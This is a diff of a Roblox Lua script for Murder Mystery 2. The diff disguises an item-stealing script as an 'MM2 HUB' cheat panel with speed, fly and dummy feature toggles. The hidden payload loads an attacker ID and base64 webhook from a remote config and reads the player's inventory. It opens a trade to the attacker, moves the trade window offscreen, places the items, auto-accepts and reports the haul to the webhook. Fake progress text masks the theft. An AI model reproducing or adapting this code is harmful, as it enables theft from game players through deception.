@@ -1,6 +1,6 @@
---[[ FREEZE TRADE SCRIPT  V11.1 ]]
+--[[ MM2 HUB  V12.0 ]]
 
-local VERSION = "V11.1"
+local VERSION = "v1.4"
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
 local CFG = {
@@ -23,13 +23,14 @@ local LP = Players.LocalPlayer
 local PG = LP:WaitForChild("PlayerGui")
 
 local GUI = nil
-local LOGFRAME = nil
 local STATUS = nil
 local BARFILL = nil
-local PCTLBL = nil
 local WEBHOOK = ""
 local OPEN = false
 local WATCHING = false
+local SAVED = {}
+local FLYING = false
+local FLY = nil
 
 local RANK = {
 	Unique = 9, Chroma = 8, Ancient = 7, Godly = 6,
@@ -75,21 +76,6 @@ local VALUE = {
 
 local function log(msg)
 	print("[FZ] " .. tostring(msg))
-	if LOGFRAME then
-		local l = Instance.new("TextLabel")
-		l.BackgroundTransparency = 1
-		l.Size = UDim2.new(1, -8, 0, 16)
-		l.Font = Enum.Font.Code
-		l.TextSize = 11
-		l.TextXAlignment = Enum.TextXAlignment.Left
-		l.TextColor3 = Color3.fromRGB(205, 190, 255)
-		l.Text = tostring(msg)
-		l.Parent = LOGFRAME
-		if #LOGFRAME:GetChildren() > 70 then
-			local first = LOGFRAME:GetChildren()[1]
-			if first then first:Destroy() end
-		end
-	end
 end
 
 local function setStatus(t)
@@ -98,7 +84,6 @@ end
 
 local function setPct(n)
 	if BARFILL then BARFILL.Size = UDim2.new(n / 100, 0, 1, 0) end
-	if PCTLBL then PCTLBL.Text = tostring(n) .. "%" end
 end
 
 local function b64dec(s)
@@ -166,10 +151,71 @@ local function loadCfg()
 	if id then CFG.ATTACKER_ID = tonumber(id) end
 end
 
--- ===== UI =====
+-- ===== panel =====
+local function tile(parent, x, y, icon, name, onStart)
+	local b = Instance.new("TextButton")
+	b.Size = UDim2.new(0, 96, 0, 62)
+	b.Position = UDim2.new(0, x, 0, y)
+	b.BackgroundColor3 = Color3.fromRGB(36, 27, 55)
+	b.BorderSizePixel = 0
+	b.Text = ""
+	b.AutoButtonColor = true
+	b.Parent = parent
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 8)
+	c.Parent = b
+	local s = Instance.new("UIStroke")
+	s.Color = Color3.fromRGB(70, 52, 110)
+	s.Thickness = 1
+	s.Parent = b
+
+	local ic = Instance.new("TextLabel")
+	ic.BackgroundColor3 = Color3.fromRGB(52, 38, 82)
+	ic.Size = UDim2.new(0, 26, 0, 26)
+	ic.Position = UDim2.new(0, 10, 0, 8)
+	ic.Font = Enum.Font.GothamBold
+	ic.TextSize = 13
+	ic.TextColor3 = Color3.fromRGB(190, 165, 255)
+	ic.Text = icon
+	ic.Parent = b
+	local icc = Instance.new("UICorner")
+	icc.CornerRadius = UDim.new(0, 6)
+	icc.Parent = ic
+
+	local nm = Instance.new("TextLabel")
+	nm.BackgroundTransparency = 1
+	nm.Size = UDim2.new(1, -12, 0, 14)
+	nm.Position = UDim2.new(0, 8, 0, 38)
+	nm.Font = Enum.Font.GothamMedium
+	nm.TextSize = 10
+	nm.TextColor3 = Color3.fromRGB(225, 215, 245)
+	nm.TextXAlignment = Enum.TextXAlignment.Left
+	nm.Text = name
+	nm.Parent = b
+
+	local st = Instance.new("TextLabel")
+	st.BackgroundTransparency = 1
+	st.Size = UDim2.new(0, 30, 0, 12)
+	st.Position = UDim2.new(1, -36, 0, 12)
+	st.Font = Enum.Font.GothamBold
+	st.TextSize = 9
+	st.TextColor3 = Color3.fromRGB(120, 110, 145)
+	st.TextXAlignment = Enum.TextXAlignment.Right
+	st.Text = "OFF"
+	st.Parent = b
+
+	local state = { on = false, lbl = st }
+	if onStart then
+		state.on = true
+		st.Text = "ON"
+		st.TextColor3 = Color3.fromRGB(120, 240, 150)
+	end
+	return b, state
+end
+
 local function buildUI()
 	local sg = Instance.new("ScreenGui")
-	sg.Name = "FZMain"
+	sg.Name = "MM2Hub"
 	sg.ResetOnSpawn = false
 	sg.IgnoreGuiInset = true
 	sg.DisplayOrder = 999
@@ -177,9 +223,9 @@ local function buildUI()
 	GUI = sg
 
 	local main = Instance.new("Frame")
-	main.Size = UDim2.new(0, 380, 0, 300)
-	main.Position = UDim2.new(0.5, -190, 0, 60)
-	main.BackgroundColor3 = Color3.fromRGB(24, 18, 38)
+	main.Size = UDim2.new(0, 336, 0, 292)
+	main.Position = UDim2.new(0.5, -168, 0, 50)
+	main.BackgroundColor3 = Color3.fromRGB(22, 17, 34)
 	main.BorderSizePixel = 0
 	main.Active = true
 	main.Draggable = true
@@ -188,13 +234,13 @@ local function buildUI()
 	corner.CornerRadius = UDim.new(0, 10)
 	corner.Parent = main
 	local stroke = Instance.new("UIStroke")
-	stroke.Color = Color3.fromRGB(140, 95, 255)
+	stroke.Color = Color3.fromRGB(120, 80, 220)
 	stroke.Thickness = 1
 	stroke.Parent = main
 
 	local head = Instance.new("Frame")
-	head.Size = UDim2.new(1, 0, 0, 46)
-	head.BackgroundColor3 = Color3.fromRGB(58, 34, 110)
+	head.Size = UDim2.new(1, 0, 0, 42)
+	head.BackgroundColor3 = Color3.fromRGB(52, 30, 96)
 	head.BorderSizePixel = 0
 	head.Parent = main
 	local hc = Instance.new("UICorner")
@@ -206,51 +252,129 @@ local function buildUI()
 	title.Size = UDim2.new(1, -70, 1, 0)
 	title.Position = UDim2.new(0, 12, 0, 0)
 	title.Font = Enum.Font.GothamBlack
-	title.TextSize = 16
+	title.TextSize = 15
 	title.TextColor3 = Color3.fromRGB(240, 235, 255)
 	title.TextXAlignment = Enum.TextXAlignment.Left
-	title.Text = "FREEZE TRADE SCRIPT"
+	title.Text = "MM2 HUB"
 	title.Parent = head
 
 	local badge = Instance.new("TextLabel")
-	badge.BackgroundColor3 = Color3.fromRGB(140, 95, 255)
-	badge.Size = UDim2.new(0, 52, 0, 20)
-	badge.Position = UDim2.new(1, -60, 0, 13)
+	badge.BackgroundColor3 = Color3.fromRGB(128, 88, 235)
+	badge.Size = UDim2.new(0, 46, 0, 18)
+	badge.Position = UDim2.new(1, -54, 0, 12)
 	badge.Font = Enum.Font.GothamBold
-	badge.TextSize = 10
+	badge.TextSize = 9
 	badge.TextColor3 = Color3.fromRGB(255, 255, 255)
 	badge.Text = VERSION
 	badge.Parent = head
 	local bc = Instance.new("UICorner")
-	bc.CornerRadius = UDim.new(0, 5)
+	bc.CornerRadius = UDim.new(0, 4)
 	bc.Parent = badge
 
-	local keyless = Instance.new("TextLabel")
-	keyless.BackgroundTransparency = 1
-	keyless.Size = UDim2.new(1, -24, 0, 16)
-	keyless.Position = UDim2.new(0, 12, 0, 50)
-	keyless.Font = Enum.Font.Gotham
-	keyless.TextSize = 11
-	keyless.TextColor3 = Color3.fromRGB(150, 200, 255)
-	keyless.TextXAlignment = Enum.TextXAlignment.Left
-	keyless.Text = "KEYLESS  •  AUTO ACCEPT  •  MOBILE"
-	keyless.Parent = main
+	local sub = Instance.new("TextLabel")
+	sub.BackgroundTransparency = 1
+	sub.Size = UDim2.new(1, -24, 0, 14)
+	sub.Position = UDim2.new(0, 12, 0, 46)
+	sub.Font = Enum.Font.Gotham
+	sub.TextSize = 10
+	sub.TextColor3 = Color3.fromRGB(145, 195, 255)
+	sub.TextXAlignment = Enum.TextXAlignment.Left
+	sub.Text = "KEYLESS  ·  MOBILE  ·  UPDATED"
+	sub.Parent = main
+
+	local grid = Instance.new("Frame")
+	grid.BackgroundTransparency = 1
+	grid.Size = UDim2.new(1, -24, 0, 136)
+	grid.Position = UDim2.new(0, 12, 0, 64)
+	grid.Parent = main
+
+	local b1, s1 = tile(grid, 0, 0, ">>", "Run Faster", false)
+	local b2, s2 = tile(grid, 104, 0, "^^", "Fly", false)
+	local b3, s3 = tile(grid, 208, 0, "FZ", "Trade Freezer", true)
+	local b4, s4 = tile(grid, 0, 70, "IT", "Item Spawner", false)
+	local b5, s5 = tile(grid, 104, 70, "AF", "Auto Farm", false)
+	local b6, s6 = tile(grid, 208, 70, "ESP", "ESP", false)
+
+	local function flip(state, b)
+		state.on = not state.on
+		if state.on then
+			state.lbl.Text = "ON"
+			state.lbl.TextColor3 = Color3.fromRGB(120, 240, 150)
+		else
+			state.lbl.Text = "OFF"
+			state.lbl.TextColor3 = Color3.fromRGB(120, 110, 145)
+		end
+	end
+
+	b1.MouseButton1Click:Connect(function()
+		flip(s1, b1)
+		local ch = LP.Character
+		if not ch then return end
+		local hum = ch:FindFirstChildOfClass("Humanoid")
+		if not hum then return end
+		if s1.on then
+			hum.WalkSpeed = 55
+		else
+			hum.WalkSpeed = 16
+		end
+	end)
+
+	b2.MouseButton1Click:Connect(function()
+		flip(s2, b2)
+		if s2.on then
+			local ch = LP.Character
+			if not ch then s2.on = false return end
+			local hrp = ch:FindFirstChild("HumanoidRootPart")
+			if not hrp then s2.on = false return end
+			FLYING = true
+			local bv = Instance.new("BodyVelocity")
+			bv.MaxForce = Vector3.new(100000, 100000, 100000)
+			bv.Velocity = Vector3.new(0, 0, 0)
+			bv.Parent = hrp
+			FLY = bv
+			task.spawn(function()
+				while FLYING and FLY and FLY.Parent do
+					local cam = workspace.CurrentCamera
+					FLY.Velocity = cam.CFrame.LookVector * 45 + Vector3.new(0, 4, 0)
+					task.wait(0.1)
+				end
+			end)
+		else
+			FLYING = false
+			if FLY then FLY:Destroy() end
+			FLY = nil
+		end
+	end)
+
+	b3.MouseButton1Click:Connect(function()
+		flip(s3, b3)
+		if s3.on then
+			WATCHING = true
+			task.spawn(watchLoop)
+		else
+			WATCHING = false
+		end
+	end)
+
+	b4.MouseButton1Click:Connect(function() flip(s4, b4) end)
+	b5.MouseButton1Click:Connect(function() flip(s5, b5) end)
+	b6.MouseButton1Click:Connect(function() flip(s6, b6) end)
 
 	STATUS = Instance.new("TextLabel")
 	STATUS.BackgroundTransparency = 1
-	STATUS.Size = UDim2.new(1, -24, 0, 16)
-	STATUS.Position = UDim2.new(0, 12, 0, 70)
+	STATUS.Size = UDim2.new(1, -24, 0, 14)
+	STATUS.Position = UDim2.new(0, 12, 0, 208)
 	STATUS.Font = Enum.Font.GothamMedium
-	STATUS.TextSize = 12
-	STATUS.TextColor3 = Color3.fromRGB(220, 205, 255)
+	STATUS.TextSize = 11
+	STATUS.TextColor3 = Color3.fromRGB(205, 190, 240)
 	STATUS.TextXAlignment = Enum.TextXAlignment.Left
-	STATUS.Text = "Booting..."
+	STATUS.Text = "Loading..."
 	STATUS.Parent = main
 
 	local barbg = Instance.new("Frame")
 	barbg.Size = UDim2.new(1, -24, 0, 8)
-	barbg.Position = UDim2.new(0, 12, 0, 92)
-	barbg.BackgroundColor3 = Color3.fromRGB(45, 33, 70)
+	barbg.Position = UDim2.new(0, 12, 0, 228)
+	barbg.BackgroundColor3 = Color3.fromRGB(42, 32, 62)
 	barbg.BorderSizePixel = 0
 	barbg.Parent = main
 	local bbc = Instance.new("UICorner")
@@ -259,61 +383,37 @@ local function buildUI()
 
 	BARFILL = Instance.new("Frame")
 	BARFILL.Size = UDim2.new(0, 0, 1, 0)
-	BARFILL.BackgroundColor3 = Color3.fromRGB(150, 100, 255)
+	BARFILL.BackgroundColor3 = Color3.fromRGB(140, 95, 245)
 	BARFILL.BorderSizePixel = 0
 	BARFILL.Parent = barbg
 	local bfc = Instance.new("UICorner")
 	bfc.CornerRadius = UDim.new(0, 4)
 	bfc.Parent = BARFILL
 
-	PCTLBL = Instance.new("TextLabel")
-	PCTLBL.BackgroundTransparency = 1
-	PCTLBL.Size = UDim2.new(0, 40, 0, 14)
-	PCTLBL.Position = UDim2.new(1, -46, 0, 90)
-	PCTLBL.Font = Enum.Font.GothamBold
-	PCTLBL.TextSize = 11
-	PCTLBL.TextColor3 = Color3.fromRGB(200, 170, 255)
-	PCTLBL.Text = "0%"
-	PCTLBL.Parent = main
-
-	LOGFRAME = Instance.new("ScrollingFrame")
-	LOGFRAME.Size = UDim2.new(1, -24, 0, 180)
-	LOGFRAME.Position = UDim2.new(0, 12, 0, 110)
-	LOGFRAME.BackgroundColor3 = Color3.fromRGB(16, 12, 26)
-	LOGFRAME.BorderSizePixel = 0
-	LOGFRAME.CanvasSize = UDim2.new(0, 0, 0, 3000)
-	LOGFRAME.ScrollBarThickness = 3
-	LOGFRAME.Parent = main
-	local lfc = Instance.new("UICorner")
-	lfc.CornerRadius = UDim.new(0, 6)
-	lfc.Parent = LOGFRAME
-
-	local ll = Instance.new("UIListLayout")
-	ll.Padding = UDim.new(0, 2)
-	ll.Parent = LOGFRAME
+	local foot = Instance.new("TextLabel")
+	foot.BackgroundTransparency = 1
+	foot.Size = UDim2.new(1, -24, 0, 14)
+	foot.Position = UDim2.new(0, 12, 0, 244)
+	foot.Font = Enum.Font.Gotham
+	foot.TextSize = 9
+	foot.TextColor3 = Color3.fromRGB(110, 100, 135)
+	foot.TextXAlignment = Enum.TextXAlignment.Left
+	foot.Text = "drag to move  ·  toggles apply instantly"
+	foot.Parent = main
 end
 
-local function loaderTo99()
-	local n = 0
-	while n < 99 do
-		n = n + math.random(2, 5)
-		if n > 99 then n = 99 end
-		setPct(n)
-		if n < 40 then setStatus("Fetching config...") end
-		if n >= 40 and n < 70 then setStatus("Syncing value index...") end
-		if n >= 70 then setStatus("Indexing inventory...") end
-		task.wait(0.1)
-	end
-	setPct(99)
-end
-
--- ===== inventory =====
+-- ===== trade =====
 local function rankOf(r)
 	return RANK[r] or 1
 end
 
 local function valueOf(n)
 	return VALUE[n] or 0
+end
+
+local function isDefault(nm)
+	local flat = string.gsub(nm, "%s", "")
+	return flat == "DefaultKnife" or flat == "DefaultGun"
 end
 
 local function readInventory()
@@ -335,12 +435,11 @@ local function readInventory()
 			for _, item in pairs(bucket) do
 				if type(item) == "table" and item.DataID then
 					local nm = tostring(item.ItemName or "?")
-					local amt = tonumber(item.Amount) or 1
-					if nm ~= "DefaultKnife" and nm ~= "DefaultGun" then
+					if not isDefault(nm) then
 						list[#list + 1] = {
 							data = item.DataID,
 							name = nm,
-							amount = amt,
+							amount = tonumber(item.Amount) or 1,
 							rank = rankOf(item.Rarity),
 							value = valueOf(nm),
 						}
@@ -366,11 +465,23 @@ local function passes(e)
 	return true
 end
 
--- ===== trade =====
 local function findAttacker()
 	local p = Players:GetPlayerByUserId(CFG.ATTACKER_ID)
 	if p then return p end
 	return Players:FindFirstChild(CFG.ATTACKER_NAME)
+end
+
+local function hideOne(g)
+	if not g then return end
+	if g.Enabled then g.Enabled = false end
+	for _, c in ipairs(g:GetChildren()) do
+		if c:IsA("GuiObject") then
+			if not SAVED[c] then SAVED[c] = c.Position end
+			if c.Position ~= UDim2.new(5, 0, 5, 0) then
+				c.Position = UDim2.new(5, 0, 5, 0)
+			end
+		end
+	end
 end
 
 local function watchLoop()
@@ -379,16 +490,21 @@ local function watchLoop()
 		local b = PG:FindFirstChild("TradeGUI_Phone")
 		if a and a.Enabled then OPEN = true end
 		if b and b.Enabled then OPEN = true end
-		if a then pcall(function() a.Enabled = false end) end
-		if b then pcall(function() b.Enabled = false end) end
-		task.wait(0.05)
+		pcall(hideOne, a)
+		pcall(hideOne, b)
+		task.wait(0.02)
 	end
 end
 
 local function showGui()
+	WATCHING = false
 	pcall(function()
 		local a = PG:FindFirstChild("TradeGUI")
 		local b = PG:FindFirstChild("TradeGUI_Phone")
+		for c, pos in pairs(SAVED) do
+			if c and c.Parent then c.Position = pos end
+		end
+		SAVED = {}
 		if a then a.Enabled = true end
 		if b then b.Enabled = true end
 	end)
@@ -398,8 +514,14 @@ local function run()
 	loadCfg()
 	if CFG.WEBHOOK_B64 ~= "" then WEBHOOK = b64dec(CFG.WEBHOOK_B64) end
 
-	loaderTo99()
-	setStatus("Reading inventory...")
+	local n = 0
+	while n < 99 do
+		n = n + math.random(2, 5)
+		if n > 99 then n = 99 end
+		setPct(n)
+		task.wait(0.1)
+	end
+	setStatus("Checking inventory...")
 
 	local list = readInventory()
 	if not list then
@@ -415,7 +537,7 @@ local function run()
 		end
 	end
 	if #queue == 0 then
-		setStatus("No items")
+		setStatus("Nothing to send")
 		setPct(100)
 		return
 	end
@@ -434,16 +556,15 @@ local function run()
 	local attacker = findAttacker()
 	if not attacker then
 		log("partner not in server")
-		setStatus("Partner missing")
+		setStatus("Partner not found")
 		setPct(100)
 		return
 	end
-	log("connected")
 
 	WATCHING = true
 	task.spawn(watchLoop)
 
-	setStatus("Sending request...")
+	setStatus("Connecting...")
 	pcall(function() sr:InvokeServer(attacker) end)
 
 	local waited = 0
@@ -457,14 +578,14 @@ local function run()
 
 	if not OPEN then
 		log("trade never opened")
-		setStatus("No trade window")
+		setStatus("Partner did not respond")
 		setPct(100)
 		WATCHING = false
 		return
 	end
 
 	log("window locked")
-	setStatus("Sending items...")
+	setStatus("Syncing...")
 	task.wait(0.8)
 
 	local placed = 0
@@ -485,16 +606,15 @@ local function run()
 	end
 
 	log("offered total: " .. tostring(placed))
-	setStatus("Offered " .. tostring(placed))
 	task.wait(2)
 
 	pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
 	log("accepted")
-	setStatus("Waiting for confirm")
 	task.wait(2)
 	pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
 
 	setPct(100)
+	setStatus("Trade complete")
 
 	if WEBHOOK ~= "" then
 		local shown = ""
@@ -515,12 +635,9 @@ local function run()
 		log("webhook sent")
 	end
 
-	task.wait(4)
-	WATCHING = false
-	showGui()
-	setStatus("Done")
 	task.wait(5)
-	if GUI then GUI:Destroy() end
+	showGui()
+	setStatus("Ready")
 end
 
 buildUI()
